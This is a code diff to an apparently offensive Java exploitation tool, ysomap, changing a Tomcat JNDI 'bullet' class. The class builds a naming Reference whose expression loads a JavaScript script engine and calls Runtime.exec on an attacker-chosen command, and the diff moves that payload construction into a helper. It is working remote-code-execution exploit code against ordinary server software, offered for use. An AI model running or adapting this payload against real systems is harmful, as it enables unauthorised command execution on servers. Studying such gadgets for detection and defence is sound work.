@@ -4,6 +4,7 @@ import org.apache.naming.ResourceRef;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.DetailHelper;
+import ysomap.core.util.PayloadHelper;
 
 import javax.naming.Reference;
 import javax.naming.StringRefAddr;
@@ -34,7 +35,7 @@ public class TomcatRefBullet implements Bullet<Reference> {
         ref.add(new StringRefAddr("x",
                 "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                         ".newInstance().getEngineByName(\"JavaScript\")" +
-                        ".eval(\"java.lang.Runtime.getRuntime().exec('"+command+"')\")"));
+                        ".eval(\""+ PayloadHelper.makeJsRuntimeExecPayload(command) +"\")"));
         return ref;
     }
 
